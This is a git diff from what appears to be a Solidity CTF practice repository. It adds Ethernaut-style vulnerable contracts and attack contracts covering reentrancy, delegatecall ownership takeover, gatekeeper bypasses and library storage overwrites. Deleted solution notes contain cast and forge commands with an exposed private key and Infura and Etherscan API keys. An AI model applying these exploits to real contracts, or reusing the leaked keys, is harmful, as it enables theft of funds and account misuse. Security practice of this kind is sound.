@@ -1,0 +1,1733 @@
+[33mcommit 2d8cd31fd4a332e05affffa77b698610a15314de[m[33m ([m[1;36mHEAD -> [m[1;32mmaster[m[33m)[m
+Author: iurii <iurii.zozulynskyi@gmail.com>
+Date:   Mon Jun 19 18:04:33 2023 +0300
+
+    till 28 task
+
+[1mdiff --git a/.gitignore b/.gitignore[m
+[1mindex 85198aa..9760b0a 100644[m
+[1m--- a/.gitignore[m
+[1m+++ b/.gitignore[m
+[36m@@ -12,3 +12,5 @@[m [mdocs/[m
+ [m
+ # Dotenv file[m
+ .env[m
+[32m+[m
+[32m+[m[32mscript/[m
+\ No newline at end of file[m
+[1mdiff --git a/foundry.toml b/foundry.toml[m
+[1mindex b2a88dc..4a0a1be 100644[m
+[1m--- a/foundry.toml[m
+[1m+++ b/foundry.toml[m
+[36m@@ -2,6 +2,7 @@[m
+ src = "src"[m
+ out = "out"[m
+ libs = ["lib"][m
+[31m-solc = "0.8.10"[m
+[32m+[m[32msolc = "0.8.12"[m
+[32m+[m
+[32m+[m[32m# See more config options https://github.com/foundry-rs/foundry/tree/master/config[m
+ [m
+[31m-# See more config options https://github.com/foundry-rs/foundry/tree/master/config[m
+\ No newline at end of file[m
+[1mdiff --git a/remappings.txt b/remappings.txt[m
+[1mindex add52da..fc0ef33 100644[m
+[1m--- a/remappings.txt[m
+[1m+++ b/remappings.txt[m
+[36m@@ -1 +1 @@[m
+[31m-@openzeppelin/=lib/openzeppelin-contracts/[m
+\ No newline at end of file[m
+[32m+[m[32m@openzeppelin/=lib/openzeppelin-contracts/contracts/[m
+\ No newline at end of file[m
+[1mdiff --git a/script/01Fallback/Solution.txt b/script/01Fallback/Solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex 3e8e297..0000000[m
+[1m--- a/script/01Fallback/Solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,26 +0,0 @@[m
+[31m-1. Send tx to call contribute()[m
+[31m-[m
+[31m-cast send 0x40c2E9004eba16ff587c230A1a4Cb52D206a3922 "contribute()" \[m
+[31m---value 1wei \[m
+[31m---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m---private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 5gwei[m
+[31m-[m
+[31m-[m
+[31m-# 100000000000000 = 0.0001 ether[m
+[31m-[m
+[31m-2. Send tx to call receive()[m
+[31m-cast send 0x... \[m
+[31m---value 1wei \[m
+[31m---rpc-url https://goerli.infura.io/v3/{key} \[m
+[31m---private-key {key} \[m
+[31m---gas-limit 200000 \[m
+[31m---gas-price 5gwei[m
+[31m-[m
+[31m-3. [m
+[31m-cast send 0x... "withdraw()" \[m
+[31m---rpc-url https://goerli.infura.io/v3/{key} \[m
+[31m---private-key {key} \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 5gwei[m
+\ No newline at end of file[m
+[1mdiff --git a/script/02Fal1out/Solution.txt b/script/02Fal1out/Solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex 920bef0..0000000[m
+[1m--- a/script/02Fal1out/Solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,14 +0,0 @@[m
+[31m-cast send 0xAACBF0Dae648dC160B24e2f6CC4A186aBE0e6eD6 "Fal1out()" \[m
+[31m---value 1wei \[m
+[31m---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m---private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 5gwei[m
+[31m-[m
+[31m-[m
+[31m-cast send 0x... "Fal1out()" \[m
+[31m---value 1wei \[m
+[31m---rpc-url https://goerli.infura.io/v3/{key} \[m
+[31m---private-key {key} \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 5gwei[m
+\ No newline at end of file[m
+[1mdiff --git a/script/03Coinflip/solution.txt b/script/03Coinflip/solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex 3c91c63..0000000[m
+[1m--- a/script/03Coinflip/solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,13 +0,0 @@[m
+[31m-forge create src/03Coinflip/Solution.sol:CoinFlipCracker \[m
+[31m- --rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m- --private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m- --constructor-args "0x8009BA8242C92760b3Ce9c07651129768D868Cd4" \[m
+[31m- --etherscan-api-key 8DK386V1G5K5BEKVTTW69J3A27X14REJMF \[m
+[31m- --verify [m
+[31m-[m
+[31m-[m
+[31m-cast send 0x479845ee2151412CdA918faFBEC5a24Ee87F7508 "winCoinFlip()" \[m
+[31m---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m---private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 1gwei[m
+\ No newline at end of file[m
+[1mdiff --git a/script/04Telephone/Solution.txt b/script/04Telephone/Solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex 96ce924..0000000[m
+[1m--- a/script/04Telephone/Solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,13 +0,0 @@[m
+[31m-forge create src/04Telephone/Solution.sol:SolutionTelephon \[m
+[31m- --rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m- --private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m- --constructor-args "0xFFD56f6bFE3EA2C532cc2F827e0a281fa39E82E0" \[m
+[31m- --etherscan-api-key 8DK386V1G5K5BEKVTTW69J3A27X14REJMF \[m
+[31m- --verify [m
+[31m-[m
+[31m-[m
+[31m- cast send 0xFB35F074f29C77c830a72Dd05B0EB88A0AE88516 "changeOwnership(address _newOwner)" 0x2Cd71C554354781333019FcD78Ddccc9CEFC7F63 \[m
+[31m---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m---private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 1gwei[m
+\ No newline at end of file[m
+[1mdiff --git a/script/06Delegate/Solution.txt b/script/06Delegate/Solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex f048a04..0000000[m
+[1m--- a/script/06Delegate/Solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,8 +0,0 @@[m
+[31m-1. Send tx to call fallback()[m
+[31m-[m
+[31m-cast send 0x3A127bbaD4774157A841e27302B9ed16246b3E7d \[m
+[31m-"pwn()" 0x2Cd71C554354781333019FcD78Ddccc9CEFC7F63 \[m
+[31m---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m---private-key=0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m---gas-limit 500000 \[m
+[31m---gas-price 5gwei[m
+\ No newline at end of file[m
+[1mdiff --git a/script/07Force/Solution.txt b/script/07Force/Solution.txt[m
+[1mdeleted file mode 100644[m
+[1mindex d0b719c..0000000[m
+[1m--- a/script/07Force/Solution.txt[m
+[1m+++ /dev/null[m
+[36m@@ -1,6 +0,0 @@[m
+[31m-forge create src/07Force/Solution.sol:AttackForce \[m
+[31m- --rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \[m
+[31m- --private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \[m
+[31m- --constructor-args "0xf71e7e100DDA797d84DD647479688c0F5b5C7d7F" \[m
+[31m- --etherscan-api-key 8DK386V1G5K5BEKVTTW69J3A27X14REJMF \[m
+[31m- --verify [m
+[1mdiff --git a/src/05Token/Task.sol b/src/05Token/Task.sol[m
+[1mindex 16de1d5..c5620c4 100644[m
+[1m--- a/src/05Token/Task.sol[m
+[1m+++ b/src/05Token/Task.sol[m
+[36m@@ -6,7 +6,7 @@[m [mcontract Token {[m
+   mapping(address => uint) balances;[m
+   uint public totalSupply;[m
+ [m
+[31m-  constructor(uint _initialSupply) public {[m
+[32m+[m[32m  constructor(uint _initialSupply) {[m
+     balances[msg.sender] = totalSupply = _initialSupply;[m
+   }[m
+ [m
+[1mdiff --git a/src/06Delegate/Task.sol b/src/06Delegate/Task.sol[m
+[1mindex e69de29..882092c 100644[m
+[1m--- a/src/06Delegate/Task.sol[m
+[1m+++ b/src/06Delegate/Task.sol[m
+[36m@@ -0,0 +1,33 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mcontract Delegate {[m
+[32m+[m
+[32m+[m[32m  address public owner;[m
+[32m+[m
+[32m+[m[32m  constructor(address _owner) {[m
+[32m+[m[32m    owner = _owner;[m
+[32m+[m[32m  }[m
+[32m+[m
+[32m+[m[32m  function pwn() public {[m
+[32m+[m[32m    owner = msg.sender;[m
+[32m+[m[32m  }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract Delegation {[m
+[32m+[m
+[32m+[m[32m  address public owner;[m
+[32m+[m[32m  Delegate delegate;[m
+[32m+[m
+[32m+[m[32m  constructor(address _delegateAddress) {[m
+[32m+[m[32m    delegate = Delegate(_delegateAddress);[m
+[32m+[m[32m    owner = msg.sender;[m
+[32m+[m[32m  }[m
+[32m+[m
+[32m+[m[32m  fallback() external {[m
+[32m+[m[32m    (bool result,) = address(delegate).delegatecall(msg.data);[m
+[32m+[m[32m    if (result) {[m
+[32m+[m[32m      this;[m
+[32m+[m[32m    }[m
+[32m+[m[32m  }[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/10Re-entrancy/Solution.sol b/src/10Re-entrancy/Solution.sol[m
+[1mindex bf4936c..8f60d58 100644[m
+[1m--- a/src/10Re-entrancy/Solution.sol[m
+[1m+++ b/src/10Re-entrancy/Solution.sol[m
+[36m@@ -6,24 +6,29 @@[m [mimport './Task.sol';[m
+ contract AttackReentrance {[m
+ [m
+     Reentrance victim;[m
+[31m-    address owner;[m
+[32m+[m[32m    address payable owner;[m
+     [m
+[31m-    constructor(address _victim) {[m
+[32m+[m[32m    constructor(address payable _victim) {[m
+         victim = Reentrance(_victim);[m
+[31m-        owner = msg.sender;[m
+[32m+[m[32m        owner = payable(msg.sender);[m
+     }[m
+ [m
+     function donate() public payable {[m
+[31m-        (bool sent, bytes memory data) = victim.call{value: msg.value}("");[m
+[32m+[m[32m        victim.donate{value:msg.value}(address(this));[m
+     }[m
+ [m
+[32m+[m[32m    function attack(uint amount) public {[m
+[32m+[m[32m        victim.withdraw(amount);[m
+[32m+[m[32m    }[m
+[32m+[m[41m  [m
+[32m+[m
+     function getBack() public {[m
+         require(owner == msg.sender);[m
+         owner.transfer(address(this).balance);[m
+     }[m
+ [m
+[31m-    fallback() external payable {[m
+[31m-        if address(victim).balance > 0 {[m
+[32m+[m[32m    receive() external payable {[m
+[32m+[m[32m        if (address(victim).balance > 0) {[m
+             victim.withdraw(0.001 ether);[m
+         }[m
+     }[m
+[1mdiff --git a/src/10Re-entrancy/Task.sol b/src/10Re-entrancy/Task.sol[m
+[1mindex 21dc2c3..2db7ca3 100644[m
+[1m--- a/src/10Re-entrancy/Task.sol[m
+[1m+++ b/src/10Re-entrancy/Task.sol[m
+[36m@@ -1,7 +1,7 @@[m
+ // SPDX-License-Identifier: MIT[m
+ pragma solidity ^0.8.0;[m
+ [m
+[31m-import '@openzeppelin/math/SafeMath.sol';[m
+[32m+[m[32mimport '@openzeppelin/utils/math/SafeMath.sol';[m
+ [m
+ contract Reentrance {[m
+   [m
+[1mdiff --git a/src/11Elevator/Solution.sol b/src/11Elevator/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..1a12055[m
+[1m--- /dev/null[m
+[1m+++ b/src/11Elevator/Solution.sol[m
+[36m@@ -0,0 +1,30 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import './Task.sol';[m
+[32m+[m
+[32m+[m[32m// contract AttackElevator {[m
+[32m+[m
+[32m+[m[32m//     uint top;[m
+[32m+[m[32m//     address public owner;[m
+[32m+[m[32m//     Elevator victim;[m
+[32m+[m
+[32m+[m[32m//     constructor(address _elevator) {[m
+[32m+[m[32m//         owner = msg.sender;[m
+[32m+[m[32m//         victim = Elevator(_elevator);[m
+[32m+[m[32m//         top = 0;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function isLastFloor(uint) external returns (bool) {[m
+[32m+[m[32m//         if (top == 0) {[m
+[32m+[m[32m//             top = 1;[m
+[32m+[m[32m//             return false;[m
+[32m+[m[32m//         }[m
+[32m+[m[32m//         return true;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function attack(uint floor) public {[m
+[32m+[m[32m//         victim.goTo(floor);[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/11Elevator/Task.sol b/src/11Elevator/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..f477a05[m
+[1m--- /dev/null[m
+[1m+++ b/src/11Elevator/Task.sol[m
+[36m@@ -0,0 +1,23 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m
+[32m+[m
+[32m+[m[32m// interface Building {[m
+[32m+[m[32m//   function isLastFloor(uint) external returns (bool);[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m
+[32m+[m[32m// contract Elevator {[m
+[32m+[m[32m//   bool public top;[m
+[32m+[m[32m//   uint public floor;[m
+[32m+[m
+[32m+[m[32m//   function goTo(uint _floor) public {[m
+[32m+[m[32m//     Building building = Building(msg.sender);[m
+[32m+[m
+[32m+[m[32m//     if (! building.isLastFloor(_floor)) {[m
+[32m+[m[32m//       floor = _floor;[m
+[32m+[m[32m//       top = building.isLastFloor(floor);[m
+[32m+[m[32m//     }[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/12Privacy/Task.sol b/src/12Privacy/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..81c39d8[m
+[1m--- /dev/null[m
+[1m+++ b/src/12Privacy/Task.sol[m
+[36m@@ -0,0 +1,31 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract Privacy {[m
+[32m+[m
+[32m+[m[32m//   bool public locked = true;[m
+[32m+[m[32m//   uint256 public ID = block.timestamp;[m
+[32m+[m[32m//   uint8 private flattening = 10;[m
+[32m+[m[32m//   uint8 private denomination = 255;[m
+[32m+[m[32m//   uint16 private awkwardness = uint16(block.timestamp);[m
+[32m+[m[32m//   bytes32[3] private data;[m
+[32m+[m
+[32m+[m[32m//   constructor(bytes32[3] memory _data) {[m
+[32m+[m[32m//     data = _data;[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function unlock(bytes16 _key) public {[m
+[32m+[m[32m//     require(_key == bytes16(data[2]));[m
+[32m+[m[32m//     locked = false;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   /*[m
+[32m+[m[32m//     A bunch of super advanced solidity algorithms...[m
+[32m+[m
+[32m+[m[32m//       ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`[m
+[32m+[m[32m//       .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,[m
+[32m+[m[32m//       *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\[m
+[32m+[m[32m//       `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)[m
+[32m+[m[32m//       ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU[m
+[32m+[m[32m//   */[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/13GatekeeperOne/Solution.sol b/src/13GatekeeperOne/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..0652b74[m
+[1m--- /dev/null[m
+[1m+++ b/src/13GatekeeperOne/Solution.sol[m
+[36m@@ -0,0 +1,25 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity 0.8.12;[m
+[32m+[m
+[32m+[m[32m// import './Task.sol';[m
+[32m+[m
+[32m+[m[32m// contract AttackGatekeeperOne {[m
+[32m+[m
+[32m+[m[32m//   GatekeeperOne public victim;[m
+[32m+[m
+[32m+[m[32m//     constructor(address _victim) {[m
+[32m+[m[32m//         victim = GatekeeperOne(_victim);[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m
+[32m+[m[32m//     function attack() public {[m
+[32m+[m[32m//         bytes8 key = calculate_key();[m
+[32m+[m[32m//         address(victim).call{gas: 106754}(abi.encodeWithSignature("enter(bytes8)", key));[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function calculate_key() public view returns (bytes8 pass) {[m
+[32m+[m
+[32m+[m[32m//         uint160 mask = uint160(0xfFFFfFfffFfFFfFFfffFffFFFffffFFF0000ffff);[m
+[32m+[m[32m//         pass = bytes8(uint64(mask & uint160(tx.origin)));[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/13GatekeeperOne/Task.sol b/src/13GatekeeperOne/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..0300cd5[m
+[1m--- /dev/null[m
+[1m+++ b/src/13GatekeeperOne/Task.sol[m
+[36m@@ -0,0 +1,29 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity 0.8.12;[m
+[32m+[m
+[32m+[m[32m// contract GatekeeperOne {[m
+[32m+[m
+[32m+[m[32m//   address public entrant;[m
+[32m+[m
+[32m+[m[32m//   modifier gateOne() {[m
+[32m+[m[32m//     require(msg.sender != tx.origin);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   modifier gateTwo() {[m
+[32m+[m[32m//     require(gasleft() % 8191 == 0);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   modifier gateThree(bytes8 _gateKey) {[m
+[32m+[m[32m//       require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");[m
+[32m+[m[32m//       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");[m
+[32m+[m[32m//       require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {[m
+[32m+[m[32m//     entrant = tx.origin;[m
+[32m+[m[32m//     return true;[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/14GateKeeperTwo/Solution.sol b/src/14GateKeeperTwo/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..a187fb1[m
+[1m--- /dev/null[m
+[1m+++ b/src/14GateKeeperTwo/Solution.sol[m
+[36m@@ -0,0 +1,19 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import "./Task.sol";[m
+[32m+[m
+[32m+[m[32m// contract GatekeeperTwoAttack {[m
+[32m+[m
+[32m+[m[32m//     GatekeeperTwo public victim;[m
+[32m+[m[32m//     bytes8 public gateKey;[m
+[32m+[m
+[32m+[m
+[32m+[m[32m//     constructor(address _victim) {[m
+[32m+[m[32m//         victim = GatekeeperTwo(_victim);[m
+[32m+[m
+[32m+[m[32m//         uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;[m
+[32m+[m[32m//         gateKey = bytes8(_gateKey);[m
+[32m+[m[32m//         victim.enter(gateKey);[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/14GateKeeperTwo/Task.sol b/src/14GateKeeperTwo/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..43eb353[m
+[1m--- /dev/null[m
+[1m+++ b/src/14GateKeeperTwo/Task.sol[m
+[36m@@ -0,0 +1,29 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract GatekeeperTwo {[m
+[32m+[m
+[32m+[m[32m//   address public entrant;[m
+[32m+[m
+[32m+[m[32m//   modifier gateOne() {[m
+[32m+[m[32m//     require(msg.sender != tx.origin);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   modifier gateTwo() {[m
+[32m+[m[32m//     uint x;[m
+[32m+[m[32m//     assembly { x := extcodesize(caller()) }[m
+[32m+[m[32m//     require(x == 0);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   modifier gateThree(bytes8 _gateKey) {[m
+[32m+[m[32m//     require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {[m
+[32m+[m[32m//     entrant = tx.origin;[m
+[32m+[m[32m//     return true;[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/15NaughtCoin/Task.sol b/src/15NaughtCoin/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..fa61a99[m
+[1m--- /dev/null[m
+[1m+++ b/src/15NaughtCoin/Task.sol[m
+[36m@@ -0,0 +1,38 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';[m
+[32m+[m
+[32m+[m[32m//  contract NaughtCoin is ERC20 {[m
+[32m+[m
+[32m+[m[32m//   // string public constant name = 'NaughtCoin';[m
+[32m+[m[32m//   // string public constant symbol = '0x0';[m
+[32m+[m[32m//   // uint public constant decimals = 18;[m
+[32m+[m[32m//   uint public timeLock = block.timestamp + 10 * 365 days;[m
+[32m+[m[32m//   uint256 public INITIAL_SUPPLY;[m
+[32m+[m[32m//   address public player;[m
+[32m+[m
+[32m+[m[32m//   constructor(address _player)[m[41m [m
+[32m+[m[32m//   ERC20('NaughtCoin', '0x0') {[m
+[32m+[m[32m//     player = _player;[m
+[32m+[m[32m//     INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));[m
+[32m+[m[32m//     // _totalSupply = INITIAL_SUPPLY;[m
+[32m+[m[32m//     // _balances[player] = INITIAL_SUPPLY;[m
+[32m+[m[32m//     _mint(player, INITIAL_SUPPLY);[m
+[32m+[m[32m//     emit Transfer(address(0), player, INITIAL_SUPPLY);[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {[m
+[32m+[m[32m//     super.transfer(_to, _value);[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   // Prevent the initial owner from transferring tokens until the timelock has passed[m
+[32m+[m[32m//   modifier lockTokens() {[m
+[32m+[m[32m//     if (msg.sender == player) {[m
+[32m+[m[32m//       require(block.timestamp > timeLock);[m
+[32m+[m[32m//       _;[m
+[32m+[m[32m//     } else {[m
+[32m+[m[32m//      _;[m
+[32m+[m[32m//     }[m
+[32m+[m[32m//   }[m[41m [m
+[32m+[m[32m// }[m[41m [m
+[1mdiff --git a/src/16Preservation/Solution.sol b/src/16Preservation/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..24bc1e0[m
+[1m--- /dev/null[m
+[1m+++ b/src/16Preservation/Solution.sol[m
+[36m@@ -0,0 +1,12 @@[m
+[32m+[m[32m// contract LibraryContractAttack {[m
+[32m+[m
+[32m+[m[32m//   // stores a timestamp[m[41m [m
+[32m+[m[32m//   address public timeZone1Library = 0x08D812f4718A50C310Eba8C613fe7DEB867d5041;[m
+[32m+[m[32m//   address public timeZone2Library = 0x08D812f4718A50C310Eba8C613fe7DEB867d5041;[m
+[32m+[m[32m//   address public owner;[m[41m [m
+[32m+[m[32m//   uint storedTime;[m
+[32m+[m
+[32m+[m[32m//   function setTime(uint _time) public {[m
+[32m+[m[32m//     owner = address(uint160(_time));[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/16Preservation/Solution2.sol b/src/16Preservation/Solution2.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..ae5d8f4[m
+[1m--- /dev/null[m
+[1m+++ b/src/16Preservation/Solution2.sol[m
+[36m@@ -0,0 +1,24 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import "./Task.sol";[m
+[32m+[m
+[32m+[m
+[32m+[m[32m// contract PreservationAttack {[m
+[32m+[m
+[32m+[m[32m//     Preservation public victim;[m
+[32m+[m
+[32m+[m[32m//     constructor(address _preservation) {[m
+[32m+[m[32m//         victim = Preservation(_preservation);[m
+[32m+[m[32m//     }[m[41m   [m
+[32m+[m
+[32m+[m[32m//     function attack() public {[m
+[32m+[m[32m//         victim.setFirstTime(uint256(uint160(tx.origin)));[m
+[32m+[m[32m//     }[m
+[32m+[m[41m    [m
+[32m+[m
+[32m+[m[32m//     function setFakeLibrary(address _fakeLib) public {[m
+[32m+[m[32m//         uint256 fakeLibraryAddress = uint256(uint160(_fakeLib));[m
+[32m+[m[32m//         victim.setFirstTime(fakeLibraryAddress);[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+[1mdiff --git a/src/16Preservation/Task.sol b/src/16Preservation/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..f0fec8d[m
+[1m--- /dev/null[m
+[1m+++ b/src/16Preservation/Task.sol[m
+[36m@@ -0,0 +1,41 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract Preservation {[m
+[32m+[m
+[32m+[m[32m//   // public library contracts[m[41m [m
+[32m+[m[32m//   address public timeZone1Library;[m
+[32m+[m[32m//   address public timeZone2Library;[m
+[32m+[m[32m//   address public owner;[m[41m [m
+[32m+[m[32m//   uint storedTime;[m[41m  [m
+[32m+[m[32m//   // Sets the function signature for delegatecall[m
+[32m+[m[32m//   bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));[m
+[32m+[m
+[32m+[m[32m//   constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {[m
+[32m+[m[32m//     timeZone1Library = _timeZone1LibraryAddress;[m[41m [m
+[32m+[m[32m//     timeZone2Library = _timeZone2LibraryAddress;[m[41m [m
+[32m+[m[32m//     owner = msg.sender;[m
+[32m+[m[32m//   }[m
+[32m+[m[41m [m
+[32m+[m[32m//   // set the time for timezone 1[m
+[32m+[m[32m//   function setFirstTime(uint _timeStamp) public {[m
+[32m+[m[32m//     timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   // set the time for timezone 2[m
+[32m+[m[32m//   function setSecondTime(uint _timeStamp) public {[m
+[32m+[m[32m//     timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// // Simple library contract to set the time[m
+[32m+[m[32m// contract LibraryContract {[m
+[32m+[m
+[32m+[m[32m//   // stores a timestamp[m[41m [m
+[32m+[m[32m//   uint storedTime;[m[41m  [m
+[32m+[m
+[32m+[m[32m//   function setTime(uint _time) public {[m
+[32m+[m[32m//     storedTime = _time;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/17Recovery/Task.sol b/src/17Recovery/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..33f9b28[m
+[1m--- /dev/null[m
+[1m+++ b/src/17Recovery/Task.sol[m
+[36m@@ -0,0 +1,40 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
